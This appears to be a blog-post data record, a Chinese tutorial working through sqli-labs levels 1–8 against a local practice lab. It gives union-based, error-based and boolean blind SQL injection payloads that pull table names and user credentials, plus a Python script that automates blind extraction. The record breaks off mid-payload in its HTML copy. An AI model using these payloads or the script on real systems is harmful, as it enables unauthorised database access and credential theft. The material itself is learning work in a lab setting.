'97\n```\n`substr`取`database()`的第一个字符，ascii把它变化才能ascii码值，然后做对比，比较它的ascii码值是否大于等于97，即'a'\n![19](/img/2018-07-20/19.png)\n返回正确，然后一直判断下去，遍历所有字母，一个个去试肯定比较麻烦，所以首选写脚本，其次也不能一个个遍历，可以用二分法，可以节省很多时间，python自动跑数据库名脚本如下\n```python\nimport requests\ntxt1 = \"http://localhost/sqli-labs/Less-8/?id=1' and ascii(substr(database(),\"\ntxt2 = \",1)) >= '\"\ntxt3 = \",1)) = '\"\npayload1 = 1 \npayload2 = 97\ntxt4 = 'You are in..........'\nnum11 = 97\nnum12 = 65\nnum13 = 48\ncode = ''\nnum1 = 0\nnum2 = 0\nnum3 = 0\nfor i in range(1,9)://长度\n\turl = txt1+str(i)+txt2+str(num11)\n\treq = requests.get(url = url)\n\treqtext = req.text[570:590]\n\t//reqtext是获取页面上的内容是不是等于txt4\n\tif(reqtext == txt4):\n\t\tnum1 = 1\n\n\turl = txt1+str(i)+txt2+str(num12)\n\treq = requests.get(url = url)\n\treqtext = req.text[570:590]\n\tif(reqtext == txt4):\n\t\tnum2 = 1\n\n\turl = txt1+str(i)+txt2+str(num13)\n\treq = requests.get(url = url)\n\treqtext = req.text[570:590]\n\tif(reqtext == txt4):\n\t\tnum3 = 1\n//判断范围，数字48-57，大写65-90，小写97-122\n//字母切三次，判断三次，部分四次，abc def ghi jklm nop qrs tuv wxyz\n//数字切一次，判断五次，01234 56789\n\n\tif(num1 == 1):\n\t\tnum = 97\n\t\tnum += 13\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[570:590]\n\t\tif(reqtext == txt4):\n\t\t\tnum += 6\n\t\telse:\n\t\t\tnum -= 7\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[570:590]\n\t\tif(reqtext == txt4):\n\t\t\tnum += 3\n\t\telse:\n\t\t\tnum -= 3\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[570:590]\n\t\tif(reqtext != txt4):\n\t\t\tnum -= 3\n\t\tif(reqtext == txt4) and ((num == 106) or (num == 119)):\n\t\t\tfor j in range(num,num+4):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[570:590]\n\t\t\t\tif(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\t\telse:\n\t\t\tfor j in range(num,num+3):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[570:590]\n\t\t\t\tif(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\tif(num1 == 0 and num2 == 1):\n\t\tnum = 65\n\t\tnum += 13\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[570:590]\n\t\tif(reqtext == txt4):\n\t\t\tnum += 6\n\t\telse:\n\t\t\tnum -= 7\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[570:590]\n\t\tif(reqtext == txt4):\n\t\t\tnum += 3\n\t\telse:\n\t\t\tnum -= 3\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[570:590]\n\t\tif(reqtext != txt4):\n\t\t\tnum -= 3\n\t\tif(reqtext == txt4) and ((num == 74) or (num == 87)):\n\t\t\tfor j in range(num,num+4):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[570:590]\n\t\t\t\tif(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\t\telse:\n\t\t\tfor j in range(num,num+3):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[570:590]\n\t\t\t\tif(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\tif(num2 == 0 and num3 == 1):\n\t\tnum =48\n\t\tnum += 5\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[570:590]\n\t\tif(reqtext == txt4):\n\t\t\tfor j in range(num,num+5):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[570:590]\n\t\t\t\tif(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\t\telse:\n\t\t\tnum -= 5\n\t\t\tfor j in range(num,num+5):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[570:590]\n\t\t\t\tif(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n```\n结果如下\n![20](/img/2018-07-20/20.png)\n查表查列修改代码url部分即可,给出前面部分，长度需要自己调整，手工判断下就可以了，没有必要写脚本\n```\nimport requests\ntxt1 = \"http://localhost/sqli-labs/Less-8/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 2,1),\"\ntxt2 = \",1))) >= '\"\ntxt3 = \",1))) = '\"\n```\n\n\n妈呀写博客比学的还累。。。","source":"_posts/2018-07-20-sqli-labs1.md","raw":"---\ntitle: sqli-labs的学习记录一（1-8）\nindex_img: /img/2018-07-20/index.jpg\ndate: 2018-07-20 18:49:52\ntags: \n- 注入\n- web\n- 盲注\n---\n&emsp;&emsp;偶然发现`sqli-labs`这个练习平台（本地），这个平台有很多案例可以提供给同学学习，很适合初学者入门。写篇博客~~装个逼~~记录下学习过程（假装我是大佬）\n<!--more-->\n\n#### 下载安装\n- 首先附上github的下载地址-->[传送门](https://github.com/Audi-1/sqli-labs)\n- 下载`phpstudy`，phpstudy的站点目录是这个`PHPTutorial\\WWW`，把刚刚下载的平台解压放到里面\n- 如果我没记错的话，phpstudy的mysql初始密码是root，在`sql-connections\\db-creds.inc`写上你的mysql数据库密码\n![1](/img/2018-07-20/1.png)\n上述步骤做完后就可以启动phpstudy，然后打开火狐浏览器（记得安装hackbar插件），访问`localhost/sqli-labs-master/`看待下面的页面就算安装好了\n点击`Setup/reset Database for labs`建立数据库\n![2](/img/2018-07-20/2.png)\n\n#### 开始学习\n##### less-1\n第一关是最简单的一关了，直接`id=1'`就报错了\n![3](/img/2018-07-20/3.png)\n再测试`id=1' and '1'='1`\n![4](/img/2018-07-20/4.png)\n返回正常，不难想象我们想数据库递交`id=1`的语句为\n```\nselect * from tables where id = '1'  \n```\n递交`id=1' and '1'='1`的语句为\n```\nselect * from tables where id = '1' and '1'='1'\n```\n接下来测试`id=1' union select database() -- +`，`-- +`是注释符\n![5](/img/2018-07-20/5.png)\n发现报错了，错误上说了，列的数量对不上，修改为`id=1' union select 1,2,database() -- +`,页面返回正常但没有返回我们所希望的数据库名称\n这个是因为index.php中`mysql_fetch_array`函数只调用了一个\n![6](/img/2018-07-20/6.png)\n`mysql_fetch_array`函数的作用是从结果集中取得一行作为关联数组或数字数组或二者兼有，可以在终端下试一下，这里就不演示了，下面是我们提交sql查询语句在终端下的结果\n```\nmysql> select * from users where id = '1' union select 1,2,database();\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | Dumb     | Dumb     |\n|  1 | 2        | security |\n+----+----------+----------+\n2 rows in set (0.00 sec)\n```\n上面查询结果可以看到返回了两个结果，但是`mysql_fetch_array`只取一行，也就是说要让查询出来的结果放在第一行，这里就用最简单快捷的一种,把id的1改为-1，-1查询不到，因此结果就是我们想要的\n```\nmysql> select * from users where id = '-1' union select 1,2,database();\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | 2        | security |\n+----+----------+----------+\n1 row in set (0.00 sec)\n```\n最终的payload为`id=-1' union select 1,2,database() -- +`\n![7](/img/2018-07-20/7.png)\n由于这篇文章是面向初学者写的，可能会比较啰嗦，mysql数据库初始时有四个数据库，如下\n```\nmysql> show databases;\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| mysql              |\n| performance_schema |\n| test               |\n+--------------------+\n4 rows in set (0.01 sec)\n```\n其中，`information_schema`这个数据库中存着所有数据库的名字及表单列名，详细的细节这里不列出来有不懂的兴趣的可以去了解一下-->[传送门](https://www.jianshu.com/p/ea15158f39f7)，我们也是要先在这个数据库里找到当前数据库的表单和列名才可以把某个表的数据列出来\n```\nmysql> select table_name from information_schema.tables where table_schema = 'security';\n+------------+\n| table_name |\n+------------+\n| emails     |\n| referers   |\n| uagents    |\n| users      |\n+------------+\n4 rows in set (0.00 sec)\n```\n这里可以偷个懒，我们可以不找数据库名直接让`table_schema=database()`就可以省了一步\n```\nmysql> select table_name from information_schema.tables where table_schema = database();\n+------------+\n| table_name |\n+------------+\n| emails     |\n| referers   |\n| uagents    |\n| users      |\n+------------+\n4 rows in set (0.00 sec)\n```\n所以我们的payload为\n```\nid=-1' union select 1,2,table_name from information_schema.tables where table_schema = 'security' -- +\n```\n![8](/img/2018-07-20/8.png)\n但是这样我们只能得到一个表，下面要用到一个函数`group__concat`，下面演示一下效果\n```\nmysql> select group_concat(table_name) from information_schema.tables where table_schema = 'security';\n+-------------------------------+\n| group_concat(table_name)      |\n+-------------------------------+\n| emails,referers,uagents,users |\n+-------------------------------+\n1 row in set (0.00 sec)\n```\n`group_concat`的作用就是把多个查询结果并到一起，于是payload修改为\n```\nid=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = 'security' -- +\n```\n![9](/img/2018-07-20/9.png)\n用户账号密码应该在users表里头了,我们要查的表就是`users`表了，简单修改一下payload，把`table_name`换成`column_name`，把`information_schema.tables`换成`information_schema.columns`，再把`table_schema`换成`table_name`，payload为\n```\nid=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name = 'users' -- +\n```\n![10](/img/2018-07-20/10.png)\n列也知道了，我们就直接枚举username和password，payload为\n```\nid=-1' union select 1,group_concat(username),group_concat(password) from users -- +\n```\n![11](/img/2018-07-20/11.png)\n第一关就算是过了\n##### less-2\n第二关和第一关如出一辙，只不过id后面的内容没有引号引起来，php代码对比如下\n```\nSELECT * FROM users WHERE id='$id' LIMIT 0,1\n#第一关\nSELECT * FROM users WHERE id=$id LIMIT 0,1\n第二关\n```\n所以我们把paylaod的`id-1`后面的单引号去掉就好了甚至注释符都不用\npayload如下\n```\nid=-1 union select 1,2,database()\nid=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = 'security'\nid=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name = 'users'\nid=-1 union select 1,group_concat(username),group_concat(password) from users\n```\n第二关完\n##### less-3\n第三关\n```\nSELECT * FROM users WHERE id=('$id') LIMIT 0,1\n```\n多了括号，直接上payload吧\n```\nid=-1') union select 1,2,database() -- +\n```\n就不多列了\n##### less-4\n第四关\n这次有点不同，当我们测试`id=1'`时返回页面是正常的，测试`id=1\"`报错\n![12](/img/2018-07-20/12.png)\n根据报错信息来看，查询语句大概如下\n```\nSELECT * FROM users WHERE id=(\"$id\") LIMIT 0,1\n```\n看一眼index.php，差不多\n![13](/img/2018-07-20/13.png)\n还是那个payload，换汤不换药\n```\nid=-1\") union select 1,2,database() -- +\n```\n##### less-5\n第五关开始提高难度\n首先从大纲里看到第五关是双注入（double injection）,单引号（single quote）\n![14](/img/2018-07-20/14.png)\n这个注入我也好久才理解，就不做了，直接分析\n![15](/img/2018-07-20/15.png)\n首先，sql查询正确会返回`You are in...........`，错误会返回sql的错误，也就是说我们输入正确的查询语句不会返回结果，所以我们要提交错误的查询语句，或者说会报错的语句比较合适，先介绍一些函数`count()`，`rand()`,`floor()`,`concat_ws`\n```\ncount()         计算总数\nrand()    \t \t生成0~1的随机数\nfloor()    \t\t向下取整\nconcat_ws() \t拼接查询结果\n```\n最后一个可能不好理解，用例子说明下\n```\nmysql> select concat_ws(':',username,password) from users;\n+----------------------------------+\n| concat_ws(':',username,password) |\n+----------------------------------+\n| Dumb:Dumb                        |\n| admin:admin                      |\n| admin1:admin1                    |\n| admin2:admin2                    |\n| admin3:admin3                    |\n| dhakkan:dumbo                    |\n| admin4:admin4                    |\n+----------------------------------+\n7 rows in set (0.00 sec)\n```\n1\nrand()*2生成0~2的随机数，floor(rand()*2)产生0或1\n2\n以`select database()`为例子\n```\nselect database()\nconcat_ws(':',select database(),floor(rand()*2))\nselect conut(*),concat_ws(':',(select database()),floor(rand()*2)) as a from information_schema.tables group by a\n```\n![16](/img/2018-07-20/16.png)\n数据库名`security`已经出来了\n关于原因\n<b>`concat_ws(':',select database(),floor(rand()*2))`会产生一大堆`security:0`，`security:1`的查询结果，重点在`group by`，在排序时，排序的结果在临时表里，在插入前会先计算一遍要插入结果的内容，假如是`security:0`，如果此时临时表只有`security:1`的行不存在`security:0`的行，那么数据库要将该条记录插入临时表，由于后面的0和1是随机数，在插入时又要计算一次，那么此时的结果可能已经不再是`security:0`而变成了`security:1`了，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。</b>\n后面的基本差不多，就不列了，有人可能把这道题当做盲注来做~~一开始我也是这么想的~~\n##### less-6\n<b>双引号的双注入</b>>，把less-5的单引号变成双引号，换汤不换药\n##### less-7\n<b>导入文件注入</b>，这个需要知道网站在系统中的具体位置，（网站管理员怎么可能给你知道。。）也比较难，网上也有写的狠详细的过程-->[传送门](https://www.cnblogs.com/lcamry/p/5763105.html),就直接下一关吧\n##### less-8\nBlind Boolian Based（布尔盲注），这里又涉及到一个盲注的概念，上面的可以直接返回结果是直接注入拿到数据库表单及列等数据，盲注就是，查询结果正确页面返回正常，查询错误页面返回错误，不会带出数据\n举很简单的例子,`1=1`正确\n![17](/img/2018-07-20/17.png)\n`1=2`错误\n![18](/img/2018-07-20/18.png)\n然后注入方法就是不断的查询，通常盲注都要写脚本，先介绍一些函数，`ascii()`,这个函数式把字母变成ascii码值，`substr()`这个函数式切割字符串，假设`a=test`,`substr(a,1,1)=t`,`substr(a,2,1)=e`,以此类推，查数据库payload\n```\nid=1' and ascii(substr(database(),1,1)) >= '97\n```\n`substr`取`database()`的第一个字符，ascii把它变化才能ascii码值，然后做对比，比较它的ascii码值是否大于等于97，即'a'\n![19](/img/2018-07-20/19.png)\n返回正确，然后一直判断下去，遍历所有字母，一个个去试肯定比较麻烦，所以首选写脚本，其次也不能一个个遍历，可以用二分法，可以节省很多时间，python自动跑数据库名脚本如下\n```python\nimport requests\ntxt1 = \"http://localhost/sqli-labs/Less-8/?id=1' and ascii(substr(database(),\"\ntxt2 = \",1)) >= '\"\ntxt3 = \",1)) = '\"\npayload1 = 1 \npayload2 = 97\ntxt4 = 'You are in..........'\nnum11 = 97\nnum12 = 65\nnum13 = 48\ncode = ''\nnum1 = 0\nnum2 = 0\nnum3 = 0\nfor i in range(1,9)://长度\n\turl = txt1+str(i)+txt2+str(num11)\n\treq = requests.get(url = url)\n\treqtext = req.text[570:590]\n\t//reqtext是获取页面上的内容是不是等于txt4\n\tif(reqtext == txt4):\n\t\tnum1 = 1\n\n\turl = txt1+str(i)+txt2+str(num12)\n\treq = requests.get(url = url)\n\treqtext = req.text[570:590]\n\tif(reqtext == txt4):\n\t\tnum2 = 1\n\n\turl = txt1+str(i)+txt2+str(num13)\n\treq = requests.get(url = url)\n\treqtext = req.text[570:590]\n\tif(reqtext == txt4):\n\t\tnum3 = 1\n//判断范围，数字48-57，大写65-90，小写97-122\n//字母切三次，判断三次，部分四次，abc def ghi jklm nop qrs tuv wxyz\n//数字切一次，判断五次，01234 56789\n\n\tif(num1 == 1):\n\t\tnum = 97\n\t\tnum += 13\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[570:590]\n\t\tif(reqtext == txt4):\n\t\t\tnum += 6\n\t\telse:\n\t\t\tnum -= 7\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[570:590]\n\t\tif(reqtext == txt4):\n\t\t\tnum += 3\n\t\telse:\n\t\t\tnum -= 3\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[570:590]\n\t\tif(reqtext != txt4):\n\t\t\tnum -= 3\n\t\tif(reqtext == txt4) and ((num == 106) or (num == 119)):\n\t\t\tfor j in range(num,num+4):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[570:590]\n\t\t\t\tif(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\t\telse:\n\t\t\tfor j in range(num,num+3):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[570:590]\n\t\t\t\tif(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\tif(num1 == 0 and num2 == 1):\n\t\tnum = 65\n\t\tnum += 13\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[570:590]\n\t\tif(reqtext == txt4):\n\t\t\tnum += 6\n\t\telse:\n\t\t\tnum -= 7\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[570:590]\n\t\tif(reqtext == txt4):\n\t\t\tnum += 3\n\t\telse:\n\t\t\tnum -= 3\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[570:590]\n\t\tif(reqtext != txt4):\n\t\t\tnum -= 3\n\t\tif(reqtext == txt4) and ((num == 74) or (num == 87)):\n\t\t\tfor j in range(num,num+4):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[570:590]\n\t\t\t\tif(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\t\telse:\n\t\t\tfor j in range(num,num+3):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[570:590]\n\t\t\t\tif(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\tif(num2 == 0 and num3 == 1):\n\t\tnum =48\n\t\tnum += 5\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[570:590]\n\t\tif(reqtext == txt4):\n\t\t\tfor j in range(num,num+5):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[570:590]\n\t\t\t\tif(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\t\telse:\n\t\t\tnum -= 5\n\t\t\tfor j in range(num,num+5):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[570:590]\n\t\t\t\tif(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n```\n结果如下\n![20](/img/2018-07-20/20.png)\n查表查列修改代码url部分即可,给出前面部分，长度需要自己调整，手工判断下就可以了，没有必要写脚本\n```\nimport requests\ntxt1 = \"http://localhost/sqli-labs/Less-8/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 2,1),\"\ntxt2 = \",1))) >= '\"\ntxt3 = \",1))) = '\"\n```\n\n\n妈呀写博客比学的还累。。。","slug":"sqli-labs1","published":1,"mouth":"07","updated":"2020-09-18T03:22:21.766Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckffbhowp0005ez8kopssnh57","content":"<p>&emsp;&emsp;偶然发现<code>sqli-labs</code>这个练习平台（本地），这个平台有很多案例可以提供给同学学习，很适合初学者入门。写篇博客<del>装个逼</del>记录下学习过程（假装我是大佬）<br><a id=\"more\"></a></p>\n<h4 id=\"下载安装\"><a href=\"#下载安装\" class=\"headerlink\" title=\"下载安装\"></a>下载安装</h4><ul>\n<li>首先附上github的下载地址–&gt;<a href=\"https://github.com/Audi-1/sqli-labs\" target=\"_blank\" rel=\"noopener\">传送门</a></li>\n<li>下载<code>phpstudy</code>，phpstudy的站点目录是这个<code>PHPTutorial\\WWW</code>，把刚刚下载的平台解压放到里面</li>\n<li>如果我没记错的话，phpstudy的mysql初始密码是root，在<code>sql-connections\\db-creds.inc</code>写上你的mysql数据库密码<br><img src=\"/img/2018-07-20/1.png\" srcset=\"/img/static/loading.gif\" alt=\"1\"><br>上述步骤做完后就可以启动phpstudy，然后打开火狐浏览器（记得安装hackbar插件），访问<code>localhost/sqli-labs-master/</code>看待下面的页面就算安装好了<br>点击<code>Setup/reset Database for labs</code>建立数据库<br><img src=\"/img/2018-07-20/2.png\" srcset=\"/img/static/loading.gif\" alt=\"2\"></li>\n</ul>\n<h4 id=\"开始学习\"><a href=\"#开始学习\" class=\"headerlink\" title=\"开始学习\"></a>开始学习</h4><h5 id=\"less-1\"><a href=\"#less-1\" class=\"headerlink\" title=\"less-1\"></a>less-1</h5><p>第一关是最简单的一关了，直接<code>id=1&#39;</code>就报错了<br><img src=\"/img/2018-07-20/3.png\" srcset=\"/img/static/loading.gif\" alt=\"3\"><br>再测试<code>id=1&#39; and &#39;1&#39;=&#39;1</code><br><img src=\"/img/2018-07-20/4.png\" srcset=\"/img/static/loading.gif\" alt=\"4\"><br>返回正常，不难想象我们想数据库递交<code>id=1</code>的语句为<br><pre><code class=\"hljs undefined\"><span class=\"hljs-keyword\">select</span> * <span class=\"hljs-keyword\">from</span> <span class=\"hljs-keyword\">tables</span> <span class=\"hljs-keyword\">where</span> <span class=\"hljs-keyword\">id</span> = <span class=\"hljs-string\">'1'</span></code></pre></p>\n<p>递交<code>id=1&#39; and &#39;1&#39;=&#39;1</code>的语句为<br><pre><code class=\"hljs undefined\"><span class=\"hljs-keyword\">select</span> * <span class=\"hljs-keyword\">from</span> <span class=\"hljs-keyword\">tables</span> <span class=\"hljs-keyword\">where</span> <span class=\"hljs-keyword\">id</span> = <span class=\"hljs-string\">'1'</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-string\">'1'</span>=<span class=\"hljs-string\">'1'</span></code></pre></p>\n<p>接下来测试<code>id=1&#39; union select database() -- +</code>，<code>-- +</code>是注释符<br><img src=\"/img/2018-07-20/5.png\" srcset=\"/img/static/loading.gif\" alt=\"5\"><br>发现报错了，错误上说了，列的数量对不上，修改为<code>id=1&#39; union select 1,2,database() -- +</code>,页面返回正常但没有返回我们所希望的数据库名称<br>这个是因为index.php中<code>mysql_fetch_array</code>函数只调用了一个<br><img src=\"/img/2018-07-20/6.png\" srcset=\"/img/static/loading.gif\" alt=\"6\"><br><code>mysql_fetch_array</code>函数的作用是从结果集中取得一行作为关联数组或数字数组或二者兼有，可以在终端下试一下，这里就不演示了，下面是我们提交sql查询语句在终端下的结果<br><pre><code class=\"hljs undefined\"><span class=\"hljs-section\">mysql&gt; select * from users where id = '1' union select 1,2,database();\n+----+----------+----------+</span>\n<span class=\"hljs-section\">| id | username | password |\n+----+----------+----------+</span>\n|  1 | Dumb     | Dumb     |\n<span class=\"hljs-section\">|  1 | 2        | security |\n+----+----------+----------+</span>\n2 rows in set (0.00 sec)</code></pre></p>\n<p>上面查询结果可以看到返回了两个结果，但是<code>mysql_fetch_array</code>只取一行，也就是说要让查询出来的结果放在第一行，这里就用最简单快捷的一种,把id的1改为-1，-1查询不到，因此结果就是我们想要的<br><pre><code class=\"hljs undefined\"><span class=\"hljs-section\">mysql&gt; select * from users where id = '-1' union select 1,2,database();\n+----+----------+----------+</span>\n<span class=\"hljs-section\">| id | username | password |\n+----+----------+----------+</span>\n<span class=\"hljs-section\">|  1 | 2        | security |\n+----+----------+----------+</span>\n1 row in set (0.00 sec)</code></pre></p>\n<p>最终的payload为<code>id=-1&#39; union select 1,2,database() -- +</code><br><img src=\"/img/2018-07-20/7.png\" srcset=\"/img/static/loading.gif\" alt=\"7\"><br>由于这篇文章是面向初学者写的，可能会比较啰嗦，mysql数据库初始时有四个数据库，如下<br><pre><code class=\"hljs undefined\"><span class=\"hljs-section\">mysql&gt; show databases;\n+--------------------+</span>\n<span class=\"hljs-section\">| Database           |\n+--------------------+</span>\n| information<span class=\"hljs-emphasis\">_schema |\n| mysql              |\n| performance_</span>schema |\n<span class=\"hljs-section\">| test               |\n+--------------------+</span>\n4 rows in set (0.01 sec)</code></pre></p>\n<p>其中，<code>information_schema</code>这个数据库中存着所有数据库的名字及表单列名，详细的细节这里不列出来有不懂的兴趣的可以去了解一下–&gt;<a href=\"https://www.jianshu.com/p/ea15158f39f7\" target=\"_blank\" rel=\"noopener\">传送门</a>，我们也是要先在这个数据库里找到当前数据库的表单和列名才可以把某个表的数据列出来<br><pre><code class=\"hljs undefined\"><span class=\"hljs-section\">mysql&gt; select table_name from information_schema.tables where table_schema = 'security';\n+------------+</span>\n<span class=\"hljs-section\">| table_name |\n+------------+</span>\n| emails     |\n| referers   |\n| uagents    |\n<span class=\"hljs-section\">| users      |\n+------------+</span>\n4 rows in set (0.00 sec)</code></pre></p>\n<p>这里可以偷个懒，我们可以不找数据库名直接让<code>table_schema=database()</code>就可以省了一步<br><pre><code class=\"hljs undefined\"><span class=\"hljs-section\">mysql&gt; select table_name from information_schema.tables where table_schema = database();\n+------------+</span>\n<span class=\"hljs-section\">| table_name |\n+------------+</span>\n| emails     |\n| referers   |\n| uagents    |\n<span class=\"hljs-section\">| users      |\n+------------+</span>\n4 rows in set (0.00 sec)</code></pre></p>\n<p>所以我们的payload为<br><pre><code class=\"hljs undefined\">id=<span class=\"hljs-number\">-1</span>' <span class=\"hljs-built_in\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,table_name <span class=\"hljs-keyword\">from</span> information_schema.<span class=\"hljs-built_in\">tables</span> <span class=\"hljs-built_in\">where</span> table_schema = 'security' -- +</code></pre></p>\n<p><img src=\"/img/2018-07-20/8.png\" srcset=\"/img/static/loading.gif\" alt=\"8\"><br>但是这样我们只能得到一个表，下面要用到一个函数<code>group__concat</code>，下面演示一下效果<br><pre><code class=\"hljs undefined\"><span class=\"hljs-section\">mysql&gt; select group_concat(table_name) from information_schema.tables where table_schema = 'security';\n+-------------------------------+</span>\n<span class=\"hljs-section\">| group_concat(table_name)      |\n+-------------------------------+</span>\n<span class=\"hljs-section\">| emails,referers,uagents,users |\n+-------------------------------+</span>\n1 row in set (0.00 sec)</code></pre></p>\n<p><code>group_concat</code>的作用就是把多个查询结果并到一起，于是payload修改为<br><pre><code class=\"hljs undefined\">id=-1' union <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-keyword\">group_concat</span>(table_name) <span class=\"hljs-keyword\">from</span> information_schema.tables <span class=\"hljs-keyword\">where</span> table_schema = <span class=\"hljs-string\">'security'</span> <span class=\"hljs-comment\">-- +</span></code></pre></p>\n<p><img src=\"/img/2018-07-20/9.png\" srcset=\"/img/static/loading.gif\" alt=\"9\"><br>用户账号密码应该在users表里头了,我们要查的表就是<code>users</code>表了，简单修改一下payload，把<code>table_name</code>换成<code>column_name</code>，把<code>information_schema.tables</code>换成<code>information_schema.columns</code>，再把<code>table_schema</code>换成<code>table_name</code>，payload为<br><pre><code class=\"hljs undefined\">id=-1' union <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-keyword\">group_concat</span>(column_name) <span class=\"hljs-keyword\">from</span> information_schema.columns <span class=\"hljs-keyword\">where</span> table_name = <span class=\"hljs-string\">'users'</span> <span class=\"hljs-comment\">-- +</span></code></pre></p>\n<p><img src=\"/img/2018-07-20/10.png\" srcset=\"/img/static/loading.gif\" alt=\"10\"><br>列也知道了，我们就直接枚举username和password，payload为<br><pre><code class=\"hljs undefined\"><span class=\"hljs-attribute\">id</span>=-1' union select 